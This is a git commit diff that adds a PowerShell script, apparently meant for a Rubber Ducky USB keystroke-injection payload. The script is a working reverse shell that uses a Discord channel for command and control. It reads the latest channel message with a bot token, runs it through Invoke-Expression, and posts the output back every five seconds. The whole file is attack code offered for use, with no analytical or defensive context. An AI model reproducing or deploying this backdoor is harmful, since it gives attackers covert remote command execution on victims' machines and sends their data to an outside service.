8333479ffde8def6ca152f0386f30decc213c3a3
colepez <168139755+colepez@users.noreply.github.com>
2025-04-13 23:50:39 -0400

    Update
    Update

---
+++ RubberDucky/Discord Reverse Shell/Discord.ps1
@@ -0,0 +1,32 @@
+param (
+    [string]$Token,
+    [string]$ChannelID
+)
+
+$Header = @{Authorization = "Bot $Token"}
+$BaseURL = "https://discord.com/api/v10/channels/$ChannelID/messages"
+
+function Send-DiscordMessage($msg) {
+    $body = @{content = $msg} | ConvertTo-Json -Depth 10
+    Invoke-RestMethod -Uri $BaseURL -Method Post -Headers $Header -Body $body -ContentType "application/json"
+}
+
+function Get-LastCommand() {
+    $res = Invoke-RestMethod -Uri $BaseURL -Headers $Header -Method Get
+    return $res[0].content
+}
+
+$last = ""
+while ($true) {
+    try {
+        $cmd = Get-LastCommand
+        if ($cmd -ne $last -and $cmd -notmatch "^!") {
+            $output = Invoke-Expression $cmd | Out-String
+            Send-DiscordMessage "```\n$output\n```"
+            $last = $cmd
+        }
+    } catch {
+        Send-DiscordMessage "ERROR: $_"
+    }
+    Start-Sleep -Seconds 5
+}
